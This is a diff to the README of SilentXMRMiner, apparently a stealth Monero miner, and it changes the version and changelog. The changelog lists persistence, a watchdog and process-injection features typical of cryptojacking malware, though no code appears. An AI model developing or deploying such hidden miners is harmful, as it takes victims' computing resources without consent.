@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">
 
-# SilentXMRMiner v1.0.1 - Based on Lime Miner v0.3
+# SilentXMRMiner v1.0.2 - Based on Lime Miner v0.3
 
 
 ## Main Features
@@ -39,6 +39,11 @@ Yes, but it isn’t very efficient for mining XMR anymore since the RandomX algo
 
 ## Changes
 
+# v1.0.2 (19/03/2021)
+* Added 0% Max CPU option
+* Increased salt lengths
+* Improved Watchdog implementation
+* Improved persistance
 # v1.0.1 (14/03/2021)
 * Removed some injection options due to new Windows protections
 # v1.0 (12/03/2021)
